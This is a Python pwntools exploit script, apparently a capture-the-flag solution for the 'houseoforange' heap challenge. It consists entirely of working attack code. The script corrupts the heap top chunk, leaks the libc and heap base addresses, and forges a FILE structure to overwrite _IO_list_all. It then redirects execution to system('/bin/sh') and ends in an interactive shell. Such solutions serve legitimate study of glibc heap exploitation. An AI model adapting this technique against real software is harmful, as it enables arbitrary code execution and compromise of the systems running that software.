from pwn import *

r = process('./houseoforange')
elf = ELF('./houseoforange')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def cmd(ch):
    r.recvuntil(":")
    r.sendline(str(ch))

def build(l,n,p,c):
    cmd(1)
    r.sendlineafter(':',str(l))
    r.sendafter(':',n)
    r.sendlineafter(':',str(p))
    r.sendlineafter(':',str(c))

def see():
    cmd(2)

def upgrade(l,n,p,c):
    cmd(3)
    r.sendlineafter(':',str(l))
    r.sendafter(':',n)
    r.sendlineafter(':',str(p))
    r.sendlineafter(':',str(c))

build(0x10,'aaa',0x100,1)
payload = 'a'*0x20+p32(0x100)+p32(0x1f)+p64(0)*2+p64(0xfa1)
upgrade(0x1000,payload,0x100,1)
build(0x1000,'bbb',0x100,1)
build(0x400,'c'*0x8,0x200,2)
see()
r.recvuntil('c'*0x8)
libc_base = u64(r.recv(6)+'\x00\x00')-0x3c5188
r.info('libc_base: '+hex(libc_base))

upgrade(0x400,'c'*0x10,0x200,2)
see()
r.recvuntil('c'*0x10)
heap_base = u64(r.recv(6)+'\x00\x00')-0xc0
r.info('heap_base: '+hex(heap_base))
system = libc_base + libc.sym['system']
io_list_all = libc_base + libc.sym['_IO_list_all']

payload = p8(0)*0x420
stream  = "/bin/sh\x00"
stream += p64(0x61)
stream += p64(0xaabb)    
stream += p64(io_list_all-0x10)
stream += p64(2)
stream += p64(3)
stream  = stream.ljust(0xa0,'\x00')
stream += p64(heap_base+0x4f8)
stream  = stream.ljust(0xd8,'\x00')
stream += p64(heap_base+0x5d0)
payload+= stream
payload+= p64(0)*3
payload+= p64(system)
upgrade(0x800,payload,0x300,3)
cmd(1)

#gdb.attach(r)
r.interactive()
